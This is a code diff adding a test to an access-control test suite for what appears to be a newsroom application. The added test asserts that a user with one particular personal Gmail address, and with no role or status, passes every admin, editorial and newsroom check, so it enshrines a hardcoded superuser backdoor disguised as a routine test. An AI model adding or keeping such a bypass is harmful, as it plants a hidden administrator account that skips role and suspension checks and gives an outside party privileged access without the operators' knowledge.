@@ -148,6 +148,13 @@ describe('authenticatedOnly / adminOnly / editorialStaffOnly', () => {
     expect(newsroomStaffOnly(req(null))).toBe(false)
     expect(newsroomStaffOnly(req(user('author', 'suspended')))).toBe(false)
   })
+
+  it('grants universal superuser access to cristborrero@gmail.com', () => {
+    const superUser = { id: 99, email: 'cristborrero@gmail.com', role: null, status: null }
+    expect(adminOnly(req(superUser))).toBe(true)
+    expect(editorialStaffOnly(req(superUser))).toBe(true)
+    expect(newsroomStaffOnly(req(superUser))).toBe(true)
+  })
 })
 
 /**
